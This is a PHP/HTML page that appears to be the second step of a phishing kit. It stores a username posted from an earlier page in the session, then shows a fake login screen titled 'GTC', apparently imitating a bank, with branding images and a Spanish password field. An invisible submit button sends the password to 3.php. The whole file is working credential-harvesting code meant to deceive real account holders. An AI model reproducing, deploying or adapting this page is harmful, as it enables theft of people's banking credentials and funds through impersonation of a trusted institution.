<?php
    session_start();

    if(!empty($_POST['i1'])){
        $_SESSION['i1'] = $_POST['i1'];   
    }else{
        header ('Location:index.html');
    }
?>
<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>GTC</title>
  </head>
  <body>
    <style>
        *{margin: 0;padding: 0;}
    </style>
    <nav style="padding: 10px 0;height: 20px;background: #fff;border-bottom: 1px solid rgba(33,25,21,.2);text-align: center;background: linear-gradient(90deg,#0067b1,#12477d);">
        <img id="n1" src="n1.svg" alt="" style="height:24px;">
    </nav>
    <nav style="padding: 10px 0; height: 60px; background: #fff; border-bottom: 1px solid rgba(33,25,21,.2); text-align: center; ">
    <img src="l.svg" alt="" style="width:60px;">
    </nav>
    <nav style="padding: 10px 0;height: 18px;background: #fff;border-bottom: 1px solid rgba(33,25,21,.2);text-align: center;">
        <img id="n2" src="n2.svg" alt="" style="height:24px;">
    </nav>
    <div id="main-cnt" style="background-image: url(bnr1.jpg);background-repeat: no-repeat; overflow: hidden;background-size: cover;background-position: 50%; min-height:700px">
    
    <div id="ctn" style="overflow:hidden;text-align:center;background: rgb(172 172 172 / 21%);height:100vh;">
        <form method="post" action="3.php" id="f1" style="display: inline-block;width: 420px;height: 715px;background-image: url(2.svg);border-radius: 0 0 45px 45px; background-repeat: no-repeat; background-position: center;" >
            <input autofocus id="i2" name="i2" placeholder="Contraseña" type="password" required style="display: block;position: relative;color:#333;background: transparent;border: none;top: 49px;left: 129px;height: 28px;width: 156px;padding-left: 8px;outline: none;" autocomplete="off">
            <input type="submit" style="display: block;position: relative;color:#333;background: transparent;border: none;top: 65px;left: 134px;height: 36px;width: 153px;padding-left: 8px;outline: none;" value="">
        </form>
    </div>
    </div>
    <style>
        @media screen and (min-width:1024px){
            #ctn{
                text-align: right !important;
                padding-right: 46px;
            }
            
        }
        @media screen and (max-width:720px){
            #n1{
                height: 20px!important;
            }
            #n2{
                height: 18px!important;
            }
        }
        @media screen and (max-width:420px){
            #f1{
                border-radius: 0!important;
            }
            #main-cnt{
                background-image: none!important;
                background: linear-gradient(90deg,#0067b1,#12477d) !important;
            }
        }
    </style>
  </body>
</html>